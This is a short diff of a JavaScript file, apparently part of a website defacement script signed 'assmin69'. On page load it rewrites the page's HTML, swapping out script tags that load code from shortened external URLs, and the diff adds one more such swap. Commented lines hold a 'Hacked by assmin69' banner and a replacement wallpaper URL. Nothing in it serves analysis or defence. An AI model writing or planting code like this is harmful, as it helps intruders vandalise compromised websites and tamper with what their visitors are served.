@@ -1,6 +1,7 @@
 window.onload = function() {
 	var s = document.documentElement.innerHTML;
 	s = s.replace("<script src=\"http://v.ht/VZuw\"></script>","assmin69");
+	s = s.replace("<script src=\"http://v.ht/NiSn\"></script>","assmin69");
 	
 	//var bg="http://v.ht/tUvi";
 	//var s2="<h1 style='font-size:40px;color:#FF3D00'>Hacked by assmin69, enjoy this new wallpaper.</h1>";
